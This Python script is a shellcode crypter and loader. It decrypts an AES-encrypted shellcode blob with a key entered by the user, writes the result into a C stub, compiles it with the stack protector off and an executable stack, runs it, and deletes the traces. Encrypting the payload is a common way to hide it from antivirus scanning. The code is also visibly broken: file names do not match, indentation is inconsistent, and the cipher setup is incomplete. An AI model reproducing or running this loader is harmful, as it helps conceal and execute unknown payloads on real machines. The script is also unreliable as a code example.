#!/usr/bin/env python

from Crypto.Cipher import AES
import hashlib
import random
import os

shellcode = b"\x0f\xd3\xf0\x01\x9a\x2a\x97\x19\x5a\xb0\x9e\x65\xa1\x84\x96\xb8\xa5\xe3\xe0\x4d\x97\x18\x26\x6b\xbd\xee\x65\x25\x1e\xc4\x63\x3f\x41\xa3\x8f\xfa\x6a\x17\x22\x64\x35\x63\xb6\xe8\xd7\xe8\xf0\xb4\xd5\x76\x1e\x5c\x72\x33\x51\xd5\x06\xb5\xff\xef\xe6\x79\x6e\x3c\x7f\xbe\x49\xd5\x0c\x24\xd7\xe2\x12\x75\xa6\x0e\x7a\x02\x5f\x76\x28\x9d\x80\x6c\xe0\x11\xfd\x24\x0d\xde\x7b\x4f\xdc\xd1\xc2\x56\x2f\x4a\xc4\x8d\x2c\x01\x6f\x45\x25\x04\x3d\xfe\xfe\xe0\x19\xad\x95\x2b\x36\x2c\x69\x4b\xea\xf7\xec\x8e\xcc\x42\xa2\x0c\x8e\xc9\x23\xc5\x23\x13\xbf\x23\x9e\x58\x6a\xd6\x6d\x03\x19\x1b\x3d\x73\x6f\x36\xe7\xb9\x54\x1d\xda\xed\xd3\xf8\xce\xee\x62\xfe\xb9\x60"

def md5_key(key):
    b_key = str.encode(key)
    hashed = hashlib.md5(b_key)
    return hashed.hexdigest()

def format_shellcode(shellcode):
    res = ""
    for x in shellcode:
        res += "\\x%02x" % x
    return res

def unpad(shellcode):
    shellcode = format_shellcode(shellcode)
    return shellcode.replace("\\x2a","")

def execute(shellcode):
    file = open("7895.c" , "w")
    file.write('''
        #include <stdio.h>

        int main(){
            unsigned char code[] = \"''' + shellcode + '''";
            int (*ret)() = (int(*)())code;
            ret();
            return 0;
        }
    ''')
    file.close()
   os.system("gcc -fno-stack-protector -z execstack 7894.c -o 7894")
   os.system("./7894")

   os.system("rm 7894.c 7894")
    

key = input("Enter the key : ")
key = md5_key(key)
iv = ''.join([chr(random.randint(0,255)) for i in range(16)])
cipher = AES.new(key)
decrypt = cipher.decrypt(shellcode)
shellcode = unpad(decrypt)


print("[+] Decrypted shellcode : \n{}\n".format(shellcode))
print("[+] Decryption key (md5 hashed) : \n%s\n" % key)

execute(shellcode)
